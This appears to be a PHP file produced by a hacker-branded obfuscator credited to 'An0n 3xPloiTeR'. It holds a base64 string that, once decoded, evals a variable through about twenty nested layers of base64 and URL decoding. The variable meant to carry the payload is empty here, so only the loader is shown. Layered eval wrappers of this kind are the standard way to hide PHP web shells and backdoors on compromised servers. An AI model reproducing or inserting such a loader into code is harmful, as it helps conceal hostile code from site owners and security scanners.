<?php
/*
The Given Code Was Successfully Obfuscated By An0n 3xPloiTeR's Obfuscator :-)
From : http://localhost/obfuscator/obfuscator.php
Thanks For Using :D
Dont Forget To Like And Share <3
Dont Change The Variables Names And If You Change Obfuscated Code Wont Work Properly :-)
https://www.facebook.com/An0n.3xPloiTeR
*/
$UeXploiT = "JTBEJTBBZXZhbCUyOCUyNnF1b3QlM0IlM0YlMjZndCUzQiUyNnF1b3QlM0IuJTI4aHRtbHNwZWNpYWxjaGFyc19kZWNvZGUlMjh1cmxkZWNvZGUlMjhiYXNlNjRfZGVjb2RlJTI4dXJsZGVjb2RlJTI4YmFzZTY0X2RlY29kZSUyOHVybGRlY29kZSUyOGJhc2U2NF9kZWNvZGUlMjh1cmxkZWNvZGUlMjhiYXNlNjRfZGVjb2RlJTI4dXJsZGVjb2RlJTI4YmFzZTY0X2RlY29kZSUyOHVybGRlY29kZSUyOGJhc2U2NF9kZWNvZGUlMjh1cmxkZWNvZGUlMjhiYXNlNjRfZGVjb2RlJTI4YmFzZTY0X2RlY29kZSUyOGJhc2U2NF9kZWNvZGUlMjh1cmxkZWNvZGUlMjhiYXNlNjRfZGVjb2RlJTI4JTI0QW4wbl8zeFBsb2lUZVIlMjklMjklMjklMjklMjklMjklMjklMjklMjklMjklMjklMjklMjklMjklMjklMjklMjklMjklMjklMjklMjklM0I=";
$An0n_3xPloiTeR = "";
eval(htmlspecialchars_decode(urldecode(base64_decode($UeXploiT))));
exit;
?>